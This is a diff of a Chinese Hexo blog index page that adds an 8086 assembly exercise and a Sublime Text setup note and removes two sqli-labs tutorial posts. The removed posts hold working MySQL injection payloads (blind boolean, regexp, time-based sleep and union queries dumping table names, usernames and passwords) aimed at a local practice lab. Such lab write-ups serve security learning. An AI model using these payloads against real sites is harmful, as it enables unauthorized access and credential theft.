@@ -353,6 +353,318 @@
   
   
   <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://betterlh.github.io/2019/03/20/汇编-实验：将每个的单词的前4个字母改为大写字母（【bx-si-3】）/">
+
+    <span hidden itemprop="author" itemscope="" itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="lh">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/avatar.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope="" itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Hexo">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+                
+                
+                <a href="/2019/03/20/汇编-实验：将每个的单词的前4个字母改为大写字母（【bx-si-3】）/" class="post-title-link" itemprop="url">汇编-实验：将每个的单词的前4个字母改为大写字母（【bx+si+3】）</a>
+              
+            
+          </h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+
+            
+            
+            
+
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">Veröffentlicht am</span>
+              
+
+              
+                
+              
+
+              <time title="Post created: 2019-03-20 21:07:00 / Updated at: 21:58:38" itemprop="dateCreated datePublished" datetime="2019-03-20T21:07:00+08:00">2019-03-20</time>
+            
+
+            
+              
+
+              
+            
+          </span>
+
+          
+            <span class="post-category">
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">in</span>
+              
+              
+                <span itemprop="about" itemscope="" itemtype="http://schema.org/Thing"><a href="/categories/汇编/" itemprop="url" rel="index"><span itemprop="name">汇编</span></a></span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        
+          
+            <h1 id="题目："><a href="#题目：" class="headerlink" title="题目："></a>题目：</h1><p>将每个的单词的前4个字母改为大写字母（</p>
+<h1 id="key"><a href="#key" class="headerlink" title="key"></a>key</h1><ul>
+<li>两层的循环，用栈来暂存循环次数cx</li>
+<li>利用灵活的定位内存方法：  【bx+si+常数】<br>bx表示行数，由于每个单词占用16个字节，故每次加16；si表示单词中的第几个字母，inc si；常数用来指示每个单词修改的起始地址</li>
+</ul>
+<p>code 如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line">assume cs:codesg,ds:datasg,ss:stacksg</span><br><span class="line">datasg segment</span><br><span class="line">    db &apos;1. display      &apos;</span><br><span class="line">    db &apos;2. brows        &apos;</span><br><span class="line">    db &apos;3. replace      &apos;</span><br><span class="line">    db &apos;4. modify       &apos;</span><br><span class="line">datasg ends</span><br><span class="line"></span><br><span class="line">stacksg segment</span><br><span class="line">    dw 0,0,0,0,0,0,0,0</span><br><span class="line">stacksg ends</span><br><span class="line"></span><br><span class="line">codesg segment</span><br><span class="line">start:</span><br><span class="line">    mov ax,stacksg</span><br><span class="line">    mov ss,ax</span><br><span class="line">    mov sp,16</span><br><span class="line">    </span><br><span class="line">    mov ax,datasg</span><br><span class="line">    mov ds,ax</span><br><span class="line"></span><br><span class="line">    mov cx,4</span><br><span class="line">    mov bx,0</span><br><span class="line">s:</span><br><span class="line">    mov si,0</span><br><span class="line">    push cx</span><br><span class="line">    mov cx,3</span><br><span class="line">s0:</span><br><span class="line">    mov al,[bx+si+3]</span><br><span class="line">    and al,11011111b</span><br><span class="line">    mov [bx+si+3],al</span><br><span class="line">    inc si</span><br><span class="line">    loop s0</span><br><span class="line">    </span><br><span class="line">    add bx,16</span><br><span class="line">    pop cx</span><br><span class="line">    loop s</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">    mov ax,4c00H</span><br><span class="line">    int 21H</span><br><span class="line">codesg ends</span><br><span class="line"></span><br><span class="line">end start</span><br></pre></td></tr></table></figure></p>
+<p>在设置好ds 之后<br><img src="/2019/03/20/汇编-实验：将每个的单词的前4个字母改为大写字母（【bx-si-3】）/1.PNG" alt=""></p>
+<h1 id="p指令"><a href="#p指令" class="headerlink" title="p指令"></a>p指令</h1><p>我们发现p指令在没遇到loop循环指令时，其实是和t指令没什么不一样的，都是执行一步<br><img src="/2019/03/20/汇编-实验：将每个的单词的前4个字母改为大写字母（【bx-si-3】）/p.PNG" alt=""><br>但是遇到loop时，p指令就会执行完此处循环<br><img src="/2019/03/20/汇编-实验：将每个的单词的前4个字母改为大写字母（【bx-si-3】）/p2.PNG" alt=""><br>此时执行完了一次内层循环，可以看到第一个单词的字母都已经修改完毕<br>这里我们注意下p指令执行的语句<strong>loop 001A</strong><br><br><br>NEXT<br>我们接着运行，此时会遇到一个loop指令（外层的），p指令运行后<br><img src="/2019/03/20/汇编-实验：将每个的单词的前4个字母改为大写字母（【bx-si-3】）/p3.PNG" alt=""><br>我们可以看到这次p指令执行后，所有单词都已经修改完成，可见此次p指令完成的是外层循环<br>我们对比此次p指令执行的语句<strong>loop 0013</strong> 和之前的可以发现，这次的p指令执行的循环跳转是<strong>0013</strong>比之前的<strong>001A</strong>小，说明是比上次跳转到的地方更之前的语句，也证实此次p指令一次执行完了外层的循环，而上一次的p指令一次性执行的是内层</p>
+<p><strong>总之，两个p指令，一个一次性执行完了内层，一个一次性执行了外层（当前肯定是要先执行完内循环）</strong><br>注意点：看p 指令执行的是哪个loop执行  loop的地址是关键</p>
+<p>按g一次性执行完程序后<br><img src="/2019/03/20/汇编-实验：将每个的单词的前4个字母改为大写字母（【bx-si-3】）/3.PNG" alt=""></p>
+
+          
+        
+      
+    </div>
+
+    
+
+    
+    
+    
+
+    
+
+    
+      
+    
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+    
+      
+
+  
+
+  
+  
+  
+
+  
+
+  <article class="post post-type-normal" itemscope="" itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://betterlh.github.io/2019/03/18/Control/">
+
+    <span hidden itemprop="author" itemscope="" itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="lh">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/avatar.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope="" itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Hexo">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+                
+                
+                <a href="/2019/03/18/Control/" class="post-title-link" itemprop="url">Sublime Text安装Package Control</a>
+              
+            
+          </h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+
+            
+            
+            
+
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">Veröffentlicht am</span>
+              
+
+              
+                
+              
+
+              <time title="Post created: 2019-03-18 20:27:04 / Updated at: 20:52:02" itemprop="dateCreated datePublished" datetime="2019-03-18T20:27:04+08:00">2019-03-18</time>
+            
+
+            
+              
+
+              
+            
+          </span>
+
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        
+          
+            <p>参考<br><a href="https://www.cnblogs.com/notemore/p/10354918.html" target="_blank" rel="noopener">https://www.cnblogs.com/notemore/p/10354918.html</a> 这篇文章<br>具体参考上面的文章，以及下载上面的资源<br>以下简单说明情况：<br>由于自动安装失败（主要是<a href="https://packagecontrol.io" target="_blank" rel="noopener">https://packagecontrol.io</a> 这个被墙了 下载不下来导致的错误）手动安装不了package control</p>
+<p>1.我们需要自己去网络上找现成的文件（package control.sublime-package 文件）<br>2.我们下载好文件放到目录后又会出现这个问题<br><img src="/2019/03/18/Control/1.PNG" alt=""><br>因此又需要下载一个channel_v3.json 这个东西<br>弄完之后终于可以使用安装插件的功能了</p>
+
+          
+        
+      
+    </div>
+
+    
+
+    
+    
+    
+
+    
+
+    
+      
+    
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+    
+      
+
+  
+
+  
+  
+  
+
+  
+
+  <article class="post post-type-normal" itemscope="" itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
     <link itemprop="mainEntityOfPage" href="http://betterlh.github.io/2019/03/18/汇编-实验：向内存依次传送数据（【bx】和loop）/">
 
     <span hidden itemprop="author" itemscope="" itemtype="http://schema.org/Person">
@@ -1960,385 +2272,11 @@
 
 
     
-      
-
-  
-
-  
-  
-  
-
-  
-
-  <article class="post post-type-normal" itemscope="" itemtype="http://schema.org/Article">
-  
-  
-  
-  <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="http://betterlh.github.io/2019/02/21/mysql注入之盲注及sqli-labs05/">
-
-    <span hidden itemprop="author" itemscope="" itemtype="http://schema.org/Person">
-      <meta itemprop="name" content="lh">
-      <meta itemprop="description" content="">
-      <meta itemprop="image" content="/images/avatar.gif">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope="" itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="Hexo">
-    </span>
-
-    
-      <header class="post-header">
-
-        
-        
-          <h1 class="post-title" itemprop="name headline">
-                
-                
-                <a href="/2019/02/21/mysql注入之盲注及sqli-labs05/" class="post-title-link" itemprop="url">mysql注入02及sqli-labs05</a>
-              
-            
-          </h1>
-        
-
-        <div class="post-meta">
-          <span class="post-time">
-
-            
-            
-            
-
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-calendar-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">Veröffentlicht am</span>
-              
-
-              
-                
-              
-
-              <time title="Post created: 2019-02-21 16:27:10 / Updated at: 22:49:11" itemprop="dateCreated datePublished" datetime="2019-02-21T16:27:10+08:00">2019-02-21</time>
-            
-
-            
-              
-
-              
-            
-          </span>
-
-          
-            <span class="post-category">
-            
-              <span class="post-meta-divider">|</span>
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-folder-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">in</span>
-              
-              
-                <span itemprop="about" itemscope="" itemtype="http://schema.org/Thing"><a href="/categories/Mysql注入-sqlilabs/" itemprop="url" rel="index"><span itemprop="name">Mysql注入-sqlilabs</span></a></span>
-
-                
-                
-              
-            </span>
-          
-
-          
-            
-          
-
-          
-          
-
-          
-
-          
-
-          
-
-        </div>
-      </header>
-    
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-      
-
-      
-        
-          
-            <p>mysql注入之盲注<br>主要是我认为简单的一些基于布尔 SQL 盲注，同时将结合实际案例sqli-labs05</p>
-<h1 id="基于布尔-SQL-盲注———-构造逻辑判断"><a href="#基于布尔-SQL-盲注———-构造逻辑判断" class="headerlink" title="基于布尔 SQL 盲注———-构造逻辑判断"></a>基于布尔 SQL 盲注———-构造逻辑判断</h1><h2 id="截取字符及ASCII转换"><a href="#截取字符及ASCII转换" class="headerlink" title="截取字符及ASCII转换"></a>截取字符及ASCII转换</h2><p>left(database(),1)&gt;’s’ //left()函数<br>Explain:database()显示数据库名称，left(a,b)从左侧截取 a 的前 b 位<br>▲ascii(substr((select table_name information_schema.tables where tables_schema =database()limit 0,1),1,1))=101 –+ //substr()函数，ascii()函数</p>
-<h3 id="实践："><a href="#实践：" class="headerlink" title="实践："></a>实践：</h3><h4 id="left-函数"><a href="#left-函数" class="headerlink" title="left()函数"></a>left()函数</h4><p>ID:1’ and left(version(),1)=5–+<br><img src="/2019/02/21/mysql注入之盲注及sqli-labs05/left1.png" alt=""></p>
-<h4 id="爆库"><a href="#爆库" class="headerlink" title="爆库"></a>爆库</h4><p>1.猜测数据库第一位<br> ID: 1’and left(database(),1)&gt;’a’–+<br>Database()为 security，所以我们看他的第一位是否 &gt;a,很明显的是 s&gt;a,因此返回正确。当 我们不知情的情况下，可以用二分法来提高注入的效率。<br>2.猜测数据库第二位 得知第一位为 s，我们看前两位是否大于 sa<br>  ID:1’and left(database(),2)&gt;’sa’–+</p>
-<h4 id="爆表"><a href="#爆表" class="headerlink" title="爆表"></a>爆表</h4><ol>
-<li>security库下的第一个表： email   e=101 m=109<br>ID:1’and ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1))=101–+<br><img src="/2019/02/21/mysql注入之盲注及sqli-labs05/1.png" alt=""></li>
-<li>下一个字符，只需将substr（）函数下的第三个参数改为二<br>ID:1’and ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),2,1))=109–+<br><img src="/2019/02/21/mysql注入之盲注及sqli-labs05/2.png" alt=""></li>
-<li>下一个表，只需将limit中的0，1 改为1，1  依此类推<br>ID:1’and ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 1,1),1,1))=114–+<br>//此处 114 返回是正确的，因为第二个表示 referers表，所以第一位就是 r.<br><img src="/2019/02/21/mysql注入之盲注及sqli-labs05/3.png" alt=""><h4 id="爆列"><a href="#爆列" class="headerlink" title="爆列"></a>爆列</h4>下一步：表中的列：（一个个查过去比较麻烦，可以用正则来判断表中是否有某个列，针对性较强）<br>爆users表中的列<br>ID:1’and ascii(substr((select column_name from information_schema.columns where table_name=’users’ limit 1,1),1,1))=117–+<br><img src="/2019/02/21/mysql注入之盲注及sqli-labs05/4.png" alt=""><br>第一个字符为u  可以推测出第一个列为username<h4 id="爆数据"><a href="#爆数据" class="headerlink" title="爆数据"></a>爆数据</h4>爆username中的数据<br>ID:1’and ascii(substr((select username from users limit 1,1),1,1))=65–+<br>username中的第一行为A开头的用户名<br><img src="/2019/02/21/mysql注入之盲注及sqli-labs05/5.png" alt=""></li>
-</ol>
-<h2 id="regexp-正则注入"><a href="#regexp-正则注入" class="headerlink" title="regexp 正则注入"></a>regexp 正则注入</h2><h3 id="正则注入介绍："><a href="#正则注入介绍：" class="headerlink" title="正则注入介绍："></a>正则注入介绍：</h3><p><a href="http://www.cnblogs.com/lcamry/articles/5717442.html" target="_blank" rel="noopener">http://www.cnblogs.com/lcamry/articles/5717442.html</a></p>
-<h3 id="用法介绍："><a href="#用法介绍：" class="headerlink" title="用法介绍："></a>用法介绍：</h3><p>select user() regexp ‘^[a-z]’;<br>Explain：正则表达式的用法，user()结果为 root，regexp 为匹配 root 的正则表达式。<br>第二位可以用 select user() regexp ‘^ro’来进行。<br>select * from users where id=1 and 1=(select 1 from information_schema.tables where table_schema=’security’ and table_name regexp ‘^us[a-z]’ limit 0,1);</p>
-<h3 id="实例："><a href="#实例：" class="headerlink" title="实例："></a>实例：</h3><p>1.爆表<br>查询库下是否有us开头的表名，<br>ID:1’and 1=(select 1 from information_schema.tables where table_schema=’security’ and table_name regexp ‘^us[a-z]’ limit 0,1)–+<br><img src="/2019/02/21/mysql注入之盲注及sqli-labs05/正则1.png" alt=""><br>严格匹配库中是否有一个表名为users的表<br>ID:1’and 1=(select 1 from information_schema.tables where table_schema=’security’ and table_name regexp ‘^users$’ limit 0,1)–+<br><img src="/2019/02/21/mysql注入之盲注及sqli-labs05/正则2.png" alt=""><br>2.爆列<br>users表中是否一个username列<br>ID:1’and 1=(select 1 from information_schema.columns where table_name=’users’ and column_name regexp ‘^username’ limit 0,1)–+<br><img src="/2019/02/21/mysql注入之盲注及sqli-labs05/正则3.png" alt=""><br>users表中是否一个password列<br>ID:1’and 1=(select 1 from information_schema.columns where table_name=’users’ and column_name regexp ‘^password’ limit 0,1)–+<br><img src="/2019/02/21/mysql注入之盲注及sqli-labs05/正则4.png" alt=""></p>
-<p>3.爆数据<br>username列中是否存在一个用户名为dummy：<br>ID:1’and 1=(select 1 from users where username regexp’^dummy’ limit 0,1)–+<br><img src="/2019/02/21/mysql注入之盲注及sqli-labs05/正则5.png" alt=""></p>
-<h2 id="like-匹配注入"><a href="#like-匹配注入" class="headerlink" title="like 匹配注入"></a>like 匹配注入</h2><p>和上述的正则类似，mysql 在匹配的时候我们可以用 ike 进行匹配。</p>
-<h3 id="用法：select-user-like-‘ro-’"><a href="#用法：select-user-like-‘ro-’" class="headerlink" title="用法：select user() like ‘ro%’"></a>用法：select user() like ‘ro%’</h3><h3 id="实例"><a href="#实例" class="headerlink" title="实例"></a>实例</h3><p>ID:1’and 1=(select 1 from users where username like ‘dummy’ limit 0,1)–+</p>
-<p><img src="/2019/02/21/mysql注入之盲注及sqli-labs05/like.png" alt=""><br>延时注入 利用 sleep()函数进行注入<br><a href="http://127.0.0.1/sqllib/Less-5/?id=1&#39;and" target="_blank" rel="noopener">http://127.0.0.1/sqllib/Less-5/?id=1&#39;and</a> If(ascii(substr(database(),1,1))=115,1,sleep(5))–+<br>正确时：直接显示页面<br><img src="/2019/02/21/mysql注入之盲注及sqli-labs05/延时1.png" alt=""><br>错误时，执行sleep（5）<br><img src="/2019/02/21/mysql注入之盲注及sqli-labs05/延时2.png" alt=""><br>5秒延时后<br><img src="/2019/02/21/mysql注入之盲注及sqli-labs05/延时3.png" alt=""></p>
-
-          
-        
-      
-    </div>
-
-    
-
-    
-    
-    
-
-    
-
-    
-      
-    
-    
-
-    
-
-    <footer class="post-footer">
-      
-
-      
-
-      
-
-      
-      
-        <div class="post-eof"></div>
-      
-    </footer>
-  </div>
-  
-  
-  
-  </article>
-
-
-    
-      
-
-  
-
-  
-  
-  
-
-  
-
-  <article class="post post-type-normal" itemscope="" itemtype="http://schema.org/Article">
-  
-  
-  
-  <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="http://betterlh.github.io/2019/02/18/Mysql 注入及sqli-labs 01/">
-
-    <span hidden itemprop="author" itemscope="" itemtype="http://schema.org/Person">
-      <meta itemprop="name" content="lh">
-      <meta itemprop="description" content="">
-      <meta itemprop="image" content="/images/avatar.gif">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope="" itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="Hexo">
-    </span>
-
-    
-      <header class="post-header">
-
-        
-        
-          <h1 class="post-title" itemprop="name headline">
-                
-                
-                <a href="/2019/02/18/Mysql 注入及sqli-labs 01/" class="post-title-link" itemprop="url">Mysql 注入及sqli-labs 01</a>
-              
-            
-          </h1>
-        
-
-        <div class="post-meta">
-          <span class="post-time">
-
-            
-            
-            
-
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-calendar-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">Veröffentlicht am</span>
-              
-
-              
-                
-              
-
-              <time title="Post created: 2019-02-18 20:16:57" itemprop="dateCreated datePublished" datetime="2019-02-18T20:16:57+08:00">2019-02-18</time>
-            
-
-            
-              
-
-              
-                
-                <span class="post-meta-divider">|</span>
-                
-
-                <span class="post-meta-item-icon">
-                  <i class="fa fa-calendar-check-o"></i>
-                </span>
-                
-                  <span class="post-meta-item-text">Edited on</span>
-                
-                <time title="Updated at: 2019-02-19 19:38:47" itemprop="dateModified" datetime="2019-02-19T19:38:47+08:00">2019-02-19</time>
-              
-            
-          </span>
-
-          
-            <span class="post-category">
-            
-              <span class="post-meta-divider">|</span>
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-folder-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">in</span>
-              
-              
-                <span itemprop="about" itemscope="" itemtype="http://schema.org/Thing"><a href="/categories/Mysql注入-sqlilabs/" itemprop="url" rel="index"><span itemprop="name">Mysql注入-sqlilabs</span></a></span>
-
-                
-                
-              
-            </span>
-          
-
-          
-            
-          
-
-          
-          
-
-          
-
-          
-
-          
-
-        </div>
-      </header>
-    
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-      
-
-      
-        
-          
-            <h1 id="注入步骤"><a href="#注入步骤" class="headerlink" title="注入步骤"></a>注入步骤</h1><p>一个数据库当中有很多的数据表，数据表当中有<br>很多的列，每一列当中存储着数据。我们注入的过程就是先拿到数据库名，在获取到当前数<br>据库名下的数据表，再获取当前数据表下的列，最后获取数据。</p>
-<h2 id="1：order-by-猜测字段个数"><a href="#1：order-by-猜测字段个数" class="headerlink" title="1：order by 猜测字段个数"></a>1：order by 猜测字段个数</h2><h2 id="2：爆显示位"><a href="#2：爆显示位" class="headerlink" title="2：爆显示位"></a>2：爆显示位</h2><p>根据获取到的字段数来爆显示位//（注意使用联合查询时让前面的查询为假）<br>例 union select 1，2，3…</p>
-<h2 id="3查询数据库版本和当前数据库"><a href="#3查询数据库版本和当前数据库" class="headerlink" title="3查询数据库版本和当前数据库"></a>3查询数据库版本和当前数据库</h2><p>union联合查询（根据爆出的显示位在相应位置查询数据库版本和当前数据库）<br><img src="/2019/02/18/Mysql 注入及sqli-labs 01/步骤1.png" alt=""><br>之后利用information_schema数据库爆相关信息<br><img src="/2019/02/18/Mysql 注入及sqli-labs 01/步骤2.png" alt=""></p>
-<h2 id="4：爆表"><a href="#4：爆表" class="headerlink" title="4：爆表"></a>4：爆表</h2><p>select table_name from information_schema.tables where table_schema=’xxxxx’<br>根据爆出的数据库，爆出数据库下所有的表<br>例如：<br>union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=‘security‘–+<br><img src="/2019/02/18/Mysql 注入及sqli-labs 01/步骤3.png" alt=""></p>
-<h2 id="5：爆列"><a href="#5：爆列" class="headerlink" title="5：爆列"></a>5：爆列</h2><p>Select column_name from information_schema.columns where table_name=’xxxxx’<br>根据爆出的表爆出所有列<br>例如：<br>Select 1,group_concat(column_name),3 from information_schema.columns where table_name=’users’<br><img src="/2019/02/18/Mysql 注入及sqli-labs 01/步骤4.png" alt=""></p>
-<h2 id="6：爆数据"><a href="#6：爆数据" class="headerlink" title="6：爆数据"></a>6：爆数据</h2><p>获取某列的内容 Select *** from ***<br>例如<br>union select 1,group_concat(username),group_concat(password) from users–+<br><img src="/2019/02/18/Mysql 注入及sqli-labs 01/步骤5.png" alt=""></p>
-<h1 id="information-schema"><a href="#information-schema" class="headerlink" title="information_schema"></a>information_schema</h1><p><img src="/2019/02/18/Mysql 注入及sqli-labs 01/步骤2.png" alt=""><br>Mysql 有一个系统数据库<br>information_schema，存储着所有的数据库的相关信息，一般的， 我们利用该表可以进行一次完整的注入。以下为一般的流程。<br>猜数据库 select schema_name from information_schema.schemata<br>猜某库的数据表<br>select table_name from information_schema.tables where table_schema=’xxxxx’<br>猜某表的所有列<br>Select column_name from information_schema.columns where table_name=’xxxxx’<br>获取某列的内容<br>Select *** from ***</p>
-<p><a href="Mysql 注入及sqli-labs 01/mysql注入天书.pdf"></a></p>
-<h1 id="less-1"><a href="#less-1" class="headerlink" title="less-1"></a>less-1</h1><p>一开始用随便写了个 id=1，竟然就可以了。说明连验证密码都没有。<br><img src="/2019/02/18/Mysql 注入及sqli-labs 01/0.png" alt=""><br>接着用order by语句测试<br><img src="/2019/02/18/Mysql 注入及sqli-labs 01/1.png" alt=""></p>
-<h2 id="information-schema数据库"><a href="#information-schema数据库" class="headerlink" title="information_schema数据库"></a>information_schema数据库</h2><p><img src="/2019/02/18/Mysql 注入及sqli-labs 01/i.png" alt=""><br>对于mysql和Infobright等数据库，information_schema数据库中的表都是只读的，不能进行更新、删除和插入等操作，也不能加触发器，因为它们实际只是一个视图，不是基本表，没有关联的文件。<br>information_schema.tables存储了数据表的元数据信息，下面对常用的字段进行介绍：<br>•    table_schema: 记录数据库名；<br>•    table_name: 记录数据表名；<br>•    engine : 存储引擎；<br>•    table_rows: 关于表的粗略行估计；<br>•    data_length : 记录表的大小（单位字节）；<br>•    index_length : 记录表的索引的大小；<br>•    row_format: 可以查看数据表是否压缩过；</p>
-<p>information_schema.tables信息；</p>
-<ol>
-<li>use information_schema;</li>
-<li>show create table tables;<br><img src="/2019/02/18/Mysql 注入及sqli-labs 01/i1.png" alt=""></li>
-<li>desc tables;<br><img src="/2019/02/18/Mysql 注入及sqli-labs 01/i2.png" alt=""></li>
-</ol>
-<hr>
-<h2 id="获取数据库和数据表信息"><a href="#获取数据库和数据表信息" class="headerlink" title="获取数据库和数据表信息"></a>获取数据库和数据表信息</h2><p>select TABLE_SCHEMA ,table_name from tables where table_schema like ‘mydatabase’;<br><img src="/2019/02/18/Mysql 注入及sqli-labs 01/i3.png" alt=""></p>
-<h2 id="Order-by"><a href="#Order-by" class="headerlink" title="Order by"></a>Order by</h2><p><strong>在sql注入的作用：猜测字段数的作用</strong><br>后面直接添加一个 ‘，来看一下效果：从上述错误当中，我们可以看到提交到 sql 中的 1’在经过 sql 语句构造后形成 ‘1’’ LIMIT 0,1， 多加了一个 ’。这种方式就是从错误信息中得到我们所需要的信息，</p>
-<p>此处可以利用 order by。Order by对前面的数据进行排序，这里有三列数据，我们就只能用 order by 3,超过 3 就会报错。 ‘order by 4–+的结果显示结果超出。<br><img src="/2019/02/18/Mysql 注入及sqli-labs 01/i4.png" alt=""><br><img src="/2019/02/18/Mysql 注入及sqli-labs 01/i5.png" alt=""></p>
-<p>从源代码中分析下为什么会造成注入？ Sql 语句为$sql=”SELECT <em> FROM users WHERE id=’$id’ LIMIT 0,1”; Id 参数在拼接 sql 语句时，未对 id 进行任何的过滤等操作，所以当提交 ‘or 1=1–+，直接构 造的 sql 语句就是 SELECT </em> FROM users WHERE id=’1’or 1=1–+ LIMIT 0,1 这条语句因 or 1=1 所以为永恒真。</p>
-<h2 id="union-联合注入"><a href="#union-联合注入" class="headerlink" title="union 联合注入"></a>union 联合注入</h2><p>此处介绍 union 联合注入，union 的作用是将两个 sql 语句进行联合。Union 可以从 下面的例子中可以看出，强调一点：union 前后的两个 sql 语句的选择列数要相同才可以。U nion all 与 union 的区别是增加了去重的功能。<br>当 id 的数据在数据库中不存在时，（此时我们可以 id=-1，两个 sql 语句进行联合操作时， 当前一个语句选择的内容为空，我们这里就将后面的语句的内容显示出来）此处前台页面返 回了我们构造的 union 的数据</p>
-<h3 id="爆数据库"><a href="#爆数据库" class="headerlink" title="爆数据库"></a>爆数据库</h3><p><a href="http://127.0.0.1/sqllib/Less-1/?id=-1%27union%20select%201,group_concat(schema_name),3%" target="_blank" rel="noopener">http://127.0.0.1/sqllib/Less-1/?id=-1%27union%20select%201,group_concat(schema_name),3%</a> 20from%20information_schema.schemata–+<br>此时的 sql 语句为<br>SELECT * FROM users WHERE id=’-1’union select 1,group_concat(schema _name),3 from information_schema.schemata–+ LIMIT 0,1</p>
-<h3 id="爆-security-数据库的数据表"><a href="#爆-security-数据库的数据表" class="headerlink" title="爆 security 数据库的数据表"></a>爆 security 数据库的数据表</h3><p><a href="http://127.0.0.1/sqllib/Less-1/?id=-1%27union%20select%201,group_concat(table_name),3%20f" target="_blank" rel="noopener">http://127.0.0.1/sqllib/Less-1/?id=-1%27union%20select%201,group_concat(table_name),3%20f</a> rom%20information_schema.tables%20where%20table_schema=%27security%27–+<br>此时的 sql 语句为<br>SELECT * FROM users WHERE id=’-1’union select 1,group_concat(table_n ame),3 from information_schema.tables where table_schema=’security’–+ LIMIT 0,1</p>
-<h3 id="爆-users-表的列"><a href="#爆-users-表的列" class="headerlink" title="爆 users 表的列"></a>爆 users 表的列</h3><p><a href="http://127.0.0.1/sqllib/Less-1/?id=-1%27union%20select%201,group_concat(column_name),3%2" target="_blank" rel="noopener">http://127.0.0.1/sqllib/Less-1/?id=-1%27union%20select%201,group_concat(column_name),3%2</a> 0from%20information_schema.columns%20where%20table_name=%27users%27–+<br>此时的 sql 语句为<br>SELECT * FROM users WHERE id=’-1’union select 1,group_concat(column _name),3 from information_schema.columns where table_name=’users’–+ LIMIT 0,1 </p>
-<h3 id="爆数据"><a href="#爆数据" class="headerlink" title="爆数据"></a>爆数据</h3><p><a href="http://127.0.0.1/sqllib/Less-1/?id=-1%27union%20select%201,username,password%20from%20" target="_blank" rel="noopener">http://127.0.0.1/sqllib/Less-1/?id=-1%27union%20select%201,username,password%20from%20</a> users%20where%20id=2–+<br>此时的 sql 语句为 SELECT * FROM users WHERE id=’-1’union select 1,username,password f rom users where id=2–+ LIMIT 0,1<br><img src="/2019/02/18/Mysql 注入及sqli-labs 01/联合.png" alt=""></p>
-<p>此处我们选择表名和库名<br>?id=%27union%20select%20table_name,table_schema,20%20from%20information_schema.tables–+<br><img src="/2019/02/18/Mysql 注入及sqli-labs 01/联合1.png" alt=""><br>发现调换顺序之后，显示的值不一样<br>?id=%27union%20select%2020,table_name,table_schema%20from%20information_schema.tables–+<br><img src="/2019/02/18/Mysql 注入及sqli-labs 01/联合2.png" alt=""></p>
